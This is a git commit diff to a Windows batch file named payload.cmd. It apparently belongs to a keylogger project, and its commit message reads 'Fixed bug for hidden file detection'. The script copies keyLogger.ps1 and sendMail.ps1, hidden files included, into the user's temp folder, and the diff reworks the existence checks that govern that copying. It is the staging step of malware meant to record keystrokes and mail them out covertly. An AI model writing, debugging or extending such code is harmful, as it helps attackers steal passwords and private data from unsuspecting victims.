4ae5bbbdf42bb817e787d145a0a325bce9ebdfea
George Tudor <tudor.george002@gmail.com>
2024-08-29 20:38:58 +0300

    Fixed bug for hidden file detection

--- payload.cmd
+++ payload.cmd
@@ -1,4 +1,4 @@
-@echo off
+@echo on
 
 set "source=%CD%\keyLogger.ps1"
 set "destination=%TEMP%\keyLogger.ps1"
@@ -7,19 +7,16 @@ set "source2=%CD%\sendMail.ps1"
 set "destination2=%TEMP%\sendMail.ps1"
 
 
-
-dir /a "%source%" >nul 2>&1
-if errorlevel 1 (
-	exit /b 1
-) else (
+if exist "%source%" (
 	echo F | xcopy /r /y /h "%source%" "%destination%" >nul 2>&1
+) else (
+	exit /b 1
 )
 
-dir /a "%source2%" >nul 2>&1
-if errorlevel 1 (
-	exit /b 1
-) else (
+if exist "%source2%" (
 	echo F | xcopy /r /y /h "%source2%" "%destination2%" >nul 2>&1
+) else (
+	exit /b 1
 )
 
 
